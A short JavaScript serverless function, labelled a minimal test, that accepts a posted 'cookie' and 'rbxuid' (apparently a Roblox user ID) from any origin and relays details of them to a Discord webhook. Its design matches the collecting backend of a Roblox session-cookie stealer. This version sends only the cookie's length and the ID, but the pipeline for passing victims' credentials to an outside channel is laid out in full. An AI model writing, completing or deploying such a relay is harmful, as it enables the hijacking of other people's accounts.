// api/submit.js – MINIMAL TEST
const WEBHOOK_URL = process.env.WEBHOOK_URL;

module.exports = async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { cookie, rbxuid } = req.body;
  console.log("Received POST with cookie length:", cookie?.length, "rbxuid:", rbxuid);
  console.log("WEBHOOK_URL exists?", !!WEBHOOK_URL);

  if (!WEBHOOK_URL) {
    console.error("WEBHOOK_URL missing");
    return res.status(500).json({ success: false, error: "WEBHOOK_URL not set in environment" });
  }

  try {
    const testPayload = {
      content: `Test from Vercel – cookie length ${cookie?.length}, rbxuid ${rbxuid}`
    };
    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(testPayload)
    });
    const responseText = await response.text();
    console.log("Discord response status:", response.status);
    console.log("Discord response body:", responseText);

    if (response.ok) {
      return res.json({ success: true, message: "Test message sent to Discord" });
    } else {
      return res.json({ success: false, error: `Discord returned ${response.status}: ${responseText}` });
    }
  } catch (err) {
    console.error("Fetch error:", err);
    return res.status(500).json({ success: false, error: err.message });
  }
};
